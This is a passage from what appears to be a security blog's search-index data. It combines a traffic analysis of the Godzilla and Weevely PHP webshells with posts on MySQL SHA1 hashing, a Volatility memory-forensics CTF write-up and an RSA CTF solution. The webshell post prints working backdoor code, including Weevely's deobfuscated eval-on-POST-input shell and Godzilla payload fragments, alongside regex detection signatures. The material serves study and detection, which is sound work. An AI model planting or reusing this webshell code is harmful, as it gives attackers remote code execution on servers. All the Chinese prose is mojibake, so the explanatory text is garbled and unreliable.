&quot;Query OK, &quot;+$conn-&gt;exec($sql)+&quot; rows affected&quot;; &#125;else&#123; $data=&quot;ok\\n&quot;; $stm=$conn-&gt;prepare($sql); $stm-&gt;execute(); $row=$stm-&gt;fetch(PDO::FETCH_ASSOC); $_row=&quot;\\n&quot;; foreach (array_keys($row) as $key)&#123; $data.=base64_encode($key).&quot;\\t&quot;; $_row.=base64_encode($row[$key]).&quot;\\t&quot;; &#125; $data.=$_row.&quot;\\n&quot;; while ($row=$stm-&gt;fetch(PDO::FETCH_ASSOC))&#123; foreach (array_keys($row) as $key)&#123; $data.=base64_encode($row[$key]).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; &#125; return $data; &#125; &#125; catch(PDOException $e) &#123; return $e-&gt;getMessage(); &#125; &#125; if ($dbType==&quot;mysql&quot;)&#123; if (extension_loaded(&quot;mysqli&quot;))&#123; return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else if (extension_loaded(&quot;pdo&quot;))&#123; return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else&#123; return &quot;no extension&quot;; &#125; &#125;else if (extension_loaded(&quot;pdo&quot;))&#123; return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else&#123; return &quot;no extension&quot;; &#125; return &quot;no extension&quot;;&#125;function base64Encode($data)&#123; return base64_encode($data);&#125;function test()&#123; return &quot;ok&quot;;&#125;function get($key)&#123; global $parameters; if (isset($parameters[$key]))&#123; return $parameters[$key]; &#125;else&#123; return null; &#125;&#125;function includeCode()&#123; @session_start(); $classCode=get(&quot;binCode&quot;); $codeName=get(&quot;codeName&quot;); $_SESSION[$codeName]=$classCode; @session_write_close(); return &quot;ok&quot;;&#125;function base64Decode($string)&#123; return base64_decode($string);&#125; 123456789101112cat /var/lib/php/sessions/sess_2fd4crdp3abn29ml2frbh5o7kspayload|s:12974:&quot;$parameters=array();function run($pms)&#123; formatParameter($pms.&#x27;&amp;ILikeYou=&#x27;.base64Encode(&#x27;metoo&#x27;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125; ä¹‹åå®¢æˆ·ç«¯åªéœ€è¦å‘é€å‡½æ•°åå³å¯ 123pass&#x3D;A2FhAQJxDwoxCyMVa2YFXjMHbQc5c3NYNTdYXA&#x3D;&#x3D;# methodName&#x3D;dGVzdA&#x3D;&#x3D;# test å“åº”å†…å®¹ä¸º [0-9a-f]&#123;16&#125;[a-zA-Z0-9\\+/=]+[0-9a-f]&#123;16&#125; å¦‚c23b1cfc51d5ff57AwREDA==36d66d61379e05ae ä¸”å‰åçš„Hexå€¼ä¸ºä¸€ä¸ªå›ºå®šçš„md5å€¼ å‚æ•°ç‰¹å¾ æ—  æµé‡ç‰¹å¾ POSTæ•°æ®ä¸­æœ‰å¤§é‡çš„Base64ç¼–ç å†…å®¹ï¼ˆé’ˆå¯¹åˆå§‹åŒ–è¿‡ç¨‹ï¼‰ å“åº”å†…å®¹ï¼š[0-9a-f]&#123;16&#125;[a-zA-Z0-9\\+/=]+[0-9a-f]&#123;16&#125; å…¶ä»– ç”±äºå“¥æ–¯æ‹‰çš„å‡½æ•°å­˜å‚¨äºsessionä¹‹ä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ä»sessionæ–‡ä»¶çš„å†…å®¹æ£€æµ‹å…¥æ‰‹ æ–‡ä»¶å†…å®¹ 123456789101112cat /var/lib/php/sessions/sess_2fd4crdp3abn29ml2frbh5o7kspayload|s:12974:&quot;$parameters=array();function run($pms)&#123; formatParameter($pms.&#x27;&amp;ILikeYou=&#x27;.base64Encode(&#x27;metoo&#x27;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125; æ–‡ä»¶å¤§å° 12ls -la &#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_2fd4crdp3abn29ml2frbh5o7ks -rw------- 1 www-data www-data 12993 Mar 16 18:22 &#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_2fd4crdp3abn29ml2frbh5o7ks weevely phpåé—¨ åæ··æ·†çš„ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728$k=&quot;1a1dc91c&quot;;$kh=&quot;907325c69271&quot;;$kf=&quot;ddf0c944bc72&quot;;$p=&quot;flb0xixOqB7g8Ds&quot;;function x($t,$k)&#123; $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) &#123; for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123; $o.=$t&#123;$i&#125;^$k&#123;$j&#125;; &#125; &#125; return $o;&#125;if (@preg_match(&quot;/$kh(.+)$kf/&quot;,@file_get_contents(&quot;php://input&quot;),$m)==1)&#123; @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]),$k))); $o=@ob_get_contents(); @ob_end_clean(); $r=@base64_encode(@x(@gzcompress($o),$k)); print(&quot;$p$kh$r$kf&quot;);&#125; å¯ä»¥çœ‹åˆ°weevelyæ‰€ä½¿ç”¨çš„åŠ å¯†æ–¹æ³•ä¸º Base64+XOR+Zlib 1234567891011121314#coding: utf-8import base64import binasciiimport zlibkey = &quot;1a1dc91c&quot;post = b&quot;Sf16qivwHbFhth4vT+seTB62/kyq9GC0hRd5SUnzHukeKxysTBP4r3q2AWTpLGZ1psXXDstel0spuJh9YawwY4DyJcM=&quot;post = base64.b64decode(post).decode(&quot;ISO-8859-1&quot;)b64 = b&quot;&quot;for _ in range(len(post)): b64 += chr(ord(post[_])^ord(key[_%len(key)])).encode(&quot;ISO-8859-1&quot;)print(zlib.decompress(b64))# b&quot;chdir(&#x27;/var/www/html&#x27;);@error_reporting(0);@system(&#x27;id 2&gt;&amp;1&#x27;);&quot; phpçš„ä¸€äº›å‹ç¼©å‡½æ•°ä»¥åŠå‚æ•°ä¸å‹ç¼©ç®—æ³•çš„å¯¹åº”å…³ç³» gzencode() gzdecode() ZLIB_ENCODING_GZIP -&gt; gzip gzcompress() gzuncompress() ZLIB_ENCODING_DEFLATE -&gt; zlib gzdeflate() gzinflate() ZLIB_ENCODING_RAW -&gt; deflate å‚æ•°ç‰¹å¾ æ— å‚æ•° æµé‡ç‰¹å¾ å®¢æˆ·ç«¯å‘é€æµé‡æ ¼å¼ scramble1+[0-9a-f]&#123;12&#125;[a-zA-Z0-9\\+/=]*?[0-9a-f]&#123;12&#125;+scramble2 ä¸”å‰åä¸¤æ®µ12å­—èŠ‚Hexå€¼åˆ†åˆ«ä¸º$khå’Œ$kf æœåŠ¡ç«¯å“åº”æµé‡æ ¼å¼ä¸º scramble+[0-9a-f]&#123;12&#125;[a-zA-Z0-9\\+/=]*?[0-9a-f]&#123;12&#125; ä¸”scrambleä¸º$pï¼Œå‰åä¸¤æ®µ12å­—èŠ‚Hexå€¼åˆ†åˆ«ä¸º$khå’Œ$kf","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Traffic_Analysis","slug":"Traffic-Analysis","permalink":"https://yoloyolo.top/tags/Traffic-Analysis/"},{"name":"WebShell","slug":"WebShell","permalink":"https://yoloyolo.top/tags/WebShell/"}]},{"title":"MysqlSha1","slug":"MysqlSha1","date":"2021-03-11T22:46:37.000Z","updated":"2022-06-27T18:27:48.000Z","comments":true,"path":"2021/03/11/MysqlSha1/","link":"","permalink":"https://yoloyolo.top/2021/03/11/MysqlSha1/","excerpt":"åœ¨4.0ç‰ˆæœ¬ä¹‹å‰ï¼ŒMysqlä½¿ç”¨Mysql323ä½œä¸ºHashå­˜å‚¨çš„æ–¹å¼ åœ¨4.1ç‰ˆæœ¬ä¹‹åï¼ŒMysqlä½¿ç”¨MysqlSha1ä½œä¸ºHashå­˜å‚¨çš„æ–¹å¼","text":"åœ¨4.0ç‰ˆæœ¬ä¹‹å‰ï¼ŒMysqlä½¿ç”¨Mysql323ä½œä¸ºHashå­˜å‚¨çš„æ–¹å¼ åœ¨4.1ç‰ˆæœ¬ä¹‹åï¼ŒMysqlä½¿ç”¨MysqlSha1ä½œä¸ºHashå­˜å‚¨çš„æ–¹å¼ Generator MysqlSha1æ˜¯åŸºäºSha1çš„Hashç®—æ³•ï¼ŒHashå‰çš„æ˜Ÿå·ç”¨äºæ ‡è¯†ä»¥åŒºåˆ«äºMysql323 123456def password(passwd): import hashlib _hash = hashlib.sha1(passwd.encode()).digest() __hash = &quot;*&quot; + hashlib.sha1(_hash).hexdigest().upper() return __hashprint(password(&quot;password&quot;)) å€¼å¾—ä¸€æçš„æ˜¯ç¬¬ä¸€æ¬¡Hashç»“æœä¸ºäºŒè¿›åˆ¶ Token mysql_native_passwordè®¤è¯æ–¹å¼ä¸‹çš„tokenç”Ÿæˆ 12345678def token(passwd, scramble): import hashlib hash1 = hashlib.sha1(passwd.encode()).digest() hash2 = hashlib.sha1(passwd.encode()).hexdigest() hash3 = hashlib.sha1(scramble.encode() + hashlib.sha1(hash1).digest()).hexdigest() token = hex(int(hash2, 16) ^ int(hash3, 16))[2:] return tokenprint(token(&quot;password&quot;, &quot;&#123;?hmkQ3Lb*Ipz3.**1WC&quot;)) Check mysql_native_passwordè®¤è¯æ–¹å¼ä¸‹çš„checkæ–¹æ³• 12345678910def check(token, __hash, scramble): import binascii import hashlib _hash1 = hashlib.sha1(binascii.unhexlify(hex(int(token, 16) ^ int(hashlib.sha1(scramble.encode() + binascii.unhexlify(__hash[1:].lower().encode())).hexdigest(), 16))[2:].encode())).hexdigest() _hash2 = __hash[1:].lower() if _hash1 == _hash2: return True else: return Falseprint(check(&quot;7230ae6e07d2b83f36aca145169248fbcd80b7a4&quot;, &quot;*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19&quot;, &quot;&#123;?hmkQ3Lb*Ipz3.**1WC&quot;)) åœ¨æ˜¾ç¤ºçš„æ—¶å€™Hashéƒ½ä¸ºHexå½¢å¼ï¼Œè®¡ç®—çš„æ—¶å€™éƒ½ä¸ºBinå½¢å¼ï¼Œåœ¨å¤„ç†çš„æ—¶å€™éœ€è¦æ³¨æ„ åœ¨ç½‘ä¸ŠæŸ¥é˜…èµ„æ–™çš„æ—¶å€™åŸºæœ¬æ²¡æœ‰è§è¿‡æœ‰æ–‡ç« æåˆ°Hashè®¡ç®—çš„æ—¶å€™ä¸ºäºŒè¿›åˆ¶ï¼Œç›´æ¥æ²»å¥½äº†æˆ‘çš„ä½è¡€å‹","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"Hash","slug":"Hash","permalink":"https://yoloyolo.top/tags/Hash/"},{"name":"Mysql","slug":"Mysql","permalink":"https://yoloyolo.top/tags/Mysql/"}]},{"title":"å†…å­˜å–è¯","slug":"Memory_Forensics","date":"2021-01-28T12:04:23.000Z","updated":"2022-06-27T18:42:38.000Z","comments":true,"path":"2021/01/28/Memory_Forensics/","link":"","permalink":"https://yoloyolo.top/2021/01/28/Memory_Forensics/","excerpt":"å‰ä¸¤å¤©åˆšæ‰“çš„ShadowCTFï¼Œé‡åˆ°äº†ä¸€äº›å†…å­˜å–è¯çš„é¢˜ç›®ï¼Œè¿™é‡Œåšä¸€äº›è®°å½• Pwné¢˜å‡ºå¾—å¤ªæ£’äº†","text":"å‰ä¸¤å¤©åˆšæ‰“çš„ShadowCTFï¼Œé‡åˆ°äº†ä¸€äº›å†…å­˜å–è¯çš„é¢˜ç›®ï¼Œè¿™é‡Œåšä¸€äº›è®°å½• Pwné¢˜å‡ºå¾—å¤ªæ£’äº† é¦–å…ˆæ˜¯ä¸€ä¸ªç³»åˆ—çš„å†…å­˜å–è¯ Suspicious Riddle The Riddler has infected batmanâ€™s PC with some suspicious programs. Find the PID of the suspicious program. è¦æ±‚æ‰¾åˆ°å¯ç–‘è¿›ç¨‹çš„PID 1volatility -f shadow.raw imageinfo æŸ¥çœ‹å†…å­˜é•œåƒçš„ä¿¡æ¯ï¼Œè¿™é‡Œä¼šç»™å‡ºå¯èƒ½çš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œè¿™ä¸ªå¯¹äºåç»­çš„å·¥ä½œæ˜¯å¾ˆé‡è¦çš„ 1234567891011121314Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (&#x2F;root&#x2F;shadow.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002a050a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002a06d00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-01-20 21:08:55 UTC+0000 Image local date and time : 2021-01-21 01:08:55 +0400 å¯ä»¥çœ‹åˆ°å¯èƒ½çš„æ“ä½œç³»ç»Ÿæœ‰å¾ˆå¤šï¼Œä¸€ä¸ªä¸€ä¸ªåœ°å°è¯•ï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹å½“æ—¶æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ 1volatility -f shadow.raw --profile&#x3D;Win7SP1x64 psscan è¿™é‡ŒæŒ‡å®šçš„ç³»ç»Ÿç‰ˆæœ¬ä¸ºWin7SP1x64ï¼Œå¯ä»¥çœ‹åˆ°psscançš„æ‰«æç»“æœï¼Œå°±è¯´æ˜æ“ä½œç³»ç»ŸåŸºæœ¬å°±æ˜¯Win7SP1x64äº† å¦‚æœæŒ‡å®šçš„ç³»ç»Ÿç‰ˆæœ¬å‡ºå…¥å¾ˆå¤§çš„è¯ï¼Œpsscanæ˜¯æ²¡æœ‰æ‰«æç»“æœçš„ 10x0000000033147630 riddle.exe 2816 1764 0x00000000178ee000 2021-01-20 21:08:24 UTC+0000 è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªriddle.exeï¼ŒPIDä¸º2816 é‚£ä¹ˆå°±è§£å‡ºäº†ç¬¬ä¸€ä¸ªé¢˜ ShadowCTF{2816} Hash Riddle Batman needs to identify what the executable is doing. Find the md5 hash of the suspicious program. Use the same raw image as Suspicious Riddle Challenge è¿™é‡Œè¦æ±‚æˆ‘ä»¬æ‰¾å‡ºå¯ç–‘ç¨‹åºçš„md5å€¼ é‚£ä¹ˆå°±éœ€è¦æŠŠç¨‹åºå¯¼å‡ºï¼Œå†è®¡ç®—md5å€¼ é”™è¯¯è§£æ³• çœ‹æˆ‘filescanæ‰¾å‡ºå¯æ‰§è¡Œæ–‡ä»¶å†å¯¼å‡ºå°±å®Œäº‹äº† 12345volatility -f shadow.raw --profile&#x3D;Win7SP1x64 filescan | grep riddle.exe 0x0000000030e18dc0 2 0 R--r-d \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\riddle.exe0x0000000030e44f20 15 0 R--r-d \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\riddle.exe0x000000003315aa90 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\riddle.exe wcï¼Ÿæ€ä¹ˆæœ‰ä¸‰ä¸ªï¼Ÿä¸ç®¡äº†ï¼Œç›´æ¥dumpfilesï¼Œä¸€ä¸ªä¸ªç®—md5äº¤flagå°±å®Œäº‹äº† 12345678volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000030e18dc0 -D ~&#x2F;test&#x2F;volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000030e44f20 -D ~&#x2F;test&#x2F;volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003315aa90 -D ~&#x2F;test&#x2F;md5sum ~&#x2F;test&#x2F;* b05e889e8436ed89157a2aa0cb8cdaa6 file.None.0xfffffa8000b5b2b0.datb8e7f5ac3579fba5a59d3eebfda80194 file.None.0xfffffa8002869280.imgc699187e1f235cb919c3bd602e99a452 file.None.0xfffffa8002c07bd0.dat ShadowCTF{b05e889e8436ed89157a2aa0cb8cdaa6} é”™è¯¯ ShadowCTF{b8e7f5ac3579fba5a59d3eebfda80194} é”™è¯¯ ShadowCTF{c699187e1f235cb919c3bd602e99a452} é”™è¯¯ åˆ°è¿™é‡Œäººéƒ½æ‡µäº†ï¼Œå°è¯•è¿‡å¯¹æ–‡ä»¶ä½¿ç”¨foremostï¼Œä½†æ˜¯è§£å‡ºçš„exeæ–‡ä»¶è¿˜æ˜¯é”™è¯¯çš„ æ­£ç¡®è§£æ³• 1volatility -f shadow.raw --profile&#x3D;Win7SP1x64 procdump -p 2816 -D ~&#x2F;test&#x2F; å°†è¿›ç¨‹å¯¼å‡ºå¯æ‰§è¡Œæ–‡ä»¶ 12md5sum ~&#x2F;test&#x2F;executable.2816.exeb4ef3e812db14a363f51efa379729715 &#x2F;root&#x2F;test&#x2F;executable.2816.exe ShadowCTF{b4ef3e812db14a363f51efa379729715} Source Riddle You found the suspicious executable, but how did it get there? His butler Alfred might have explored some malicious link. Find the source of the malware. è¿™é‡Œè¯´æ˜¯æµè§ˆæŸäº›å±é™©é“¾æ¥ä¸‹è½½çš„ç¨‹åºï¼Œæ‰¾å‡ºé“¾æ¥ 123456789volatility -f shadow.raw --profile&#x3D;Win7SP1x64 iehistory Process: 316 iexplore.exeCache type &quot;URL &quot; at 0x27c5900Record length: 0x100Location: :2021012120210122: batman@:Host: y0u-f0und-th3-s0urc3.herokuapp.comLast modified: 2021-01-21 01:08:05 UTC+0000Last accessed: 2021-01-20 21:08:05 UTC+0000File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0 æ‰¾åˆ°äº†è¿™æ ·ä¸€æ¡è®°å½• ShadowCTF{y0u-f0und-th3-s0urc3} Anarchy Riddle Look into the suspicious executable. What is the riddler trying to do? è¿™é‡Œé—®è¿›ç¨‹åœ¨å¹²å˜› é¦–å…ˆç”¨æ’é™¤æ³•ï¼Œè‚¯å®šä¸æ˜¯åœ¨æŒ–çŸ¿ å…ˆçœ‹çœ‹æœ‰å“ªäº›æ–‡ä»¶ï¼Œç„¶åå†å»çœ‹ç”¨æˆ·å’Œæ³¨å†Œè¡¨å•¥çš„ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ€è·¯ 123volatility -f shadow.raw --profile&#x3D;Win7SP1x64 filescan | grep batman 0x0000000031729380 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\meta_dense.png è¿™é‡Œçœ‹åˆ°äº†æ¡Œé¢ä¸Šæœ‰ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥å¯¼å‡ºçœ‹çœ‹ 1volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000031729380 -D ~&#x2F;test&#x2F; å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸­å¿ƒè¢«æ‰­æ›²çš„å›¾ç‰‡ï¼Œä¸Šé¢å†™ç€flagï¼Œpsä¸€ä¸‹å°±èƒ½çœ‹æ¸…æ¥šflagäº† ShadowCTF{P3nult1m4t3_R1ddl3_S0lv3d} æœ€åä¸€ä¸ªç»™äº†ä¸€ä¸ªè«åå…¶å¦™çš„å­—ç¬¦ä¸²ï¼Œbasecrackè§£ä¸å‡ºæ¥ï¼Œæ‡’å¾—åšäº† å¦å¤–è¿˜æœ‰ä¸€ä¸ªå†…å­˜å–è¯çš„é¢˜ï¼Œæ˜¯Win10X64çš„ç³»ç»Ÿï¼ŒVolatility2çš„ä¸€äº›æ¨¡å—åœ¨å¤„ç†Win10ç³»ç»Ÿæ—¶ä¼šæŠ¥é”™ï¼Œç”¨Volatility3å°±è¡Œï¼Œç„¶åä¸€äº›æ¨¡å—çš„ç”¨æ³•å¯èƒ½å’ŒVol2æœ‰å‡ºå…¥ è¿™ä¸ªé¢˜å¯¼å‡ºä¸€ä¸ªåªæœ‰ä¸€åŠçš„flagçš„å›¾ç‰‡ï¼Œè¯•äº†ä¸€ä¸‹å¸¸è§„éšå†™æ²¡æœ‰å‘ç°ï¼Œä¹Ÿæ‡’å¾—å†æ…¢æ…¢å¼„äº†","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://yoloyolo.top/tags/Misc/"},{"name":"Memory_Forensics","slug":"Memory-Forensics","permalink":"https://yoloyolo.top/tags/Memory-Forensics/"}]},{"title":"RSAé¢˜è§£è®°å½•","slug":"RSA-0","date":"2021-01-21T11:13:23.000Z","updated":"2021-03-10T07:01:31.000Z","comments":true,"path":"2021/01/21/RSA-0/","link":"","permalink":"https://yoloyolo.top/2021/01/21/RSA-0/","excerpt":"RSA &amp; CRT Discrete Log Polynomial Ring ECC","text":"RSA &amp; CRT Discrete Log Polynomial Ring ECC [De1CTF2019]babyrsa 1234567891011121314151617181920212223242526272829303132import binasciifrom data import e1,e2,p,q1p,q1q,hint,flag n = [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L]c = [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L, 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L, 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L]f=lambda m,e,n,c:pow(m,e,n)==cassert(sum(map(f,[p]*4,[4]*4,n,c))==4) ee1 = 42ee2 = 3ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384ce2 = 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158tmp = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387n = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039assert(pow(e1,ee1,n)==ce1)assert(pow(e2+tmp,ee2,n)==ce2) e = 46531n = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603c = 14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469hint=int(binascii.hexlify(hint),16)assert(q1p*q1q==n)assert(q1p&lt;q1q)assert(c==pow(hint,e,n)) flag=int(binascii.hexlify(flag),16)q1=q1pq2 = 114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513c1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124c2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596assert(c1==pow(flag,e1,p*q1))assert(c2==pow(flag,e2,p*q2)) ä½æŒ‡æ•°å¹¿æ’­ 12f=lambda m,e,n,c:pow(m,e,n)==cassert(sum(map(f,[p]*4,[4]*4,n,c))==4) æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹æ–¹ç¨‹ç»„ {c0â‰¡p4mod n0c1â‰¡p4mod n1c2â‰¡p4mod n2c3â‰¡p4mod n3\\begin{cases} c_{0} â‰¡ p^{4} \\mod n_{0} \\\\ c_{1} â‰¡ p^{4} \\mod n_{1} \\\\ c_{2} â‰¡ p^{4} \\mod n_{2} \\\\ c_{3} â‰¡ p^{4} \\mod n_{3} \\end{cases} â©âªâªâªâ¨âªâªâªâ§â€‹c0â€‹â‰¡p4modn0â€‹c1â€‹â‰¡p4modn1â€‹c2â€‹â‰¡p4modn2â€‹c3â€‹â‰¡p4modn3â€‹â€‹ ä½¿ç”¨CRTå³å¯æ±‚å‡ºpçš„å€¼ ä½æŒ‡æ•° 12assert(pow(e1,ee1,n)==ce1)assert(pow(e2+tmp,ee2,n)==ce2) câ‰¡memod nc â‰¡ m^{e} \\mod ncâ‰¡memodn me=c+kâˆ—nm^{e} = c + k*nme=c+kâˆ—n çˆ†ç ´kå³å¯æ±‚å‡º mem^{e}me m=meem = \\sqrt[e]{m^{e}}m=emeâ€‹ åˆ†è§£n 